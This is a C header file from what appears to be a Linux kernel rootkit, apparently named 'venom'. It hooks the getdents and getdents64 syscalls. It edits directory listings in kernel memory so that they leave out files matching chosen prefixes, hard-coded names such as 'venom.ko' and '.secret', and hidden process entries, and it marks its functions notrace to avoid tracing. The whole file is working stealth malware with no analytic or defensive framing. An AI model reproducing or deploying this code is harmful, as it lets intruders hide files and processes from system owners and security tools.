#ifndef GETDENTS_H
#define GETDENTS_H

#include "../include/headers.h"

static asmlinkage long (*orig_getdents64)(const struct pt_regs *regs);
static asmlinkage long (*orig_getdents)(const struct pt_regs *regs);
static char **g_hidden_prefixes = NULL;

void set_hidden_prefixes(char **prefixes) {
    g_hidden_prefixes = prefixes;
}

notrace static int should_hide_file(const char *name) {
    int i;
    if (!name || !g_hidden_prefixes) return 0;
    
    for (i = 0; g_hidden_prefixes[i] != NULL; i++) {
        if (strncmp(name, g_hidden_prefixes[i], strlen(g_hidden_prefixes[i])) == 0)
            return 1;
    }
    
    if (strstr(name, "trevohack") || strstr(name, ".secret") ||
        strstr(name, "source") || strstr(name, "_defense") ||
        strcmp(name, "venom.ko") == 0)
        return 1;
    
    return 0;
}

notrace static asmlinkage long hooked_getdents64(const struct pt_regs *regs) {
    struct linux_dirent64 __user *user_dir = (struct linux_dirent64 __user *)regs->si;
    struct linux_dirent64 *kbuf, *d, *prev = NULL;
    long ret;
    unsigned long off = 0;
    
    ret = orig_getdents64(regs);
    if (ret <= 0 || ret > 32768) return ret;
    
    kbuf = kzalloc(ret, GFP_KERNEL);
    if (!kbuf) return ret;
    
    if (copy_from_user(kbuf, user_dir, ret)) {
        kfree(kbuf);
        return ret;
    }
    
    while (off < ret) {
        d = (struct linux_dirent64 *)((char *)kbuf + off);
        if (d->d_reclen == 0 || d->d_reclen > (ret - off)) break;
        
        if (should_hide_file(d->d_name) || is_hidden_pid_entry(d->d_name)) {
            if (off == 0) {
                ret -= d->d_reclen;
                memmove(kbuf, (char *)kbuf + d->d_reclen, ret);
                continue;
            } else if (prev) {
                prev->d_reclen += d->d_reclen;
            }
        } else {
            prev = d;
        }
        off += d->d_reclen;
    }
    
    if (copy_to_user(user_dir, kbuf, ret)) {
        kfree(kbuf);
        return orig_getdents64(regs);
    }
    
    kfree(kbuf);
    return ret;
}

notrace static asmlinkage long hooked_getdents(const struct pt_regs *regs) {
    struct linux_dirent __user *user_dir = (struct linux_dirent __user *)regs->si;
    struct linux_dirent *kbuf, *d, *prev = NULL;
    long ret;
    unsigned long off = 0;
    
    ret = orig_getdents(regs);
    if (ret <= 0 || ret > 32768) return ret;
    
    kbuf = kzalloc(ret, GFP_KERNEL);
    if (!kbuf || copy_from_user(kbuf, user_dir, ret)) {
        kfree(kbuf);
        return ret;
    }
    
    while (off < ret) {
        d = (struct linux_dirent *)((char *)kbuf + off);
        if (d->d_reclen == 0 || d->d_reclen > (ret - off)) break;
        
        if (should_hide_file(d->d_name) || is_hidden_pid_entry(d->d_name)) {
            if (off == 0) {
                ret -= d->d_reclen;
                memmove(kbuf, (char *)kbuf + d->d_reclen, ret);
                continue;
            } else if (prev) prev->d_reclen += d->d_reclen;
        } else prev = d;
        off += d->d_reclen;
    }
    
    copy_to_user(user_dir, kbuf, ret);
    kfree(kbuf);
    return ret;
}

#endif 
